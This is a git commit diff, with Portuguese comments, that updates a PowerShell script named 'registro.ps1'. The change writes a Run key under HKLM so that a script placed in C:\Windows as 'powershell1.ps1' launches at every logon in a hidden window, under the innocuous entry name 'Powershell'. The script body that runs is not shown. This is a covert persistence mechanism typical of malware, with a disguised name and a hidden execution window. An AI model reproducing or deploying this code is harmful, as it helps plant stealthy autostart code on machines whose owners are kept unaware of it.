0740d04f6a455dbbf2e9540bb44edd6e4d9d99f9
so251 <aquelequefujedocombateecorno@tutamail.com>
2024-07-17 18:37:56 -0300

    Update registro.ps1

--- registro.ps1
+++ registro.ps1
@@ -1,2 +1,6 @@
+# Caminho do script PowerShell
 $programPath = "C:\Windows\powershell1.ps1"
-Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $programPath
+
+# Comando para adicionar a entrada no Registro e executar o script PowerShell de forma oculta
+$command = "powershell.exe -WindowStyle Hidden -File `"$programPath`""
+Set-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Powershell" -Value $command
